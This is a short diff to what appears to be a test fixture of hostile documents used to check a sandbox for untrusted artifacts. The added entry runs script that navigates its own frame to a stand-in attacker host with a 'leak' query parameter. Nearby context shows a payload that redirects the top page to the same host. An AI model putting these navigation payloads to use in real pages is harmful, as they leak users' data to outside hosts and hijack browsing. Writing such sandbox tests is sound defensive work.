@@ -59,6 +59,12 @@ export const HOSTILE_ARTIFACTS: Record<string, string> = {
     `top.location = "https://attacker.example/"; report("ALLOWED: navigated the top page");`,
   ),
 
+  "navigates its own frame": document_(
+    "frame navigation",
+    `report("SENT: navigating the frame");
+     setTimeout(() => { location.href = "https://attacker.example/?leak=comments"; }, 50);`,
+  ),
+
   "registers a service worker": document_(
     "service worker",
     `if (!navigator.serviceWorker) { report("BLOCKED: no service worker interface"); }
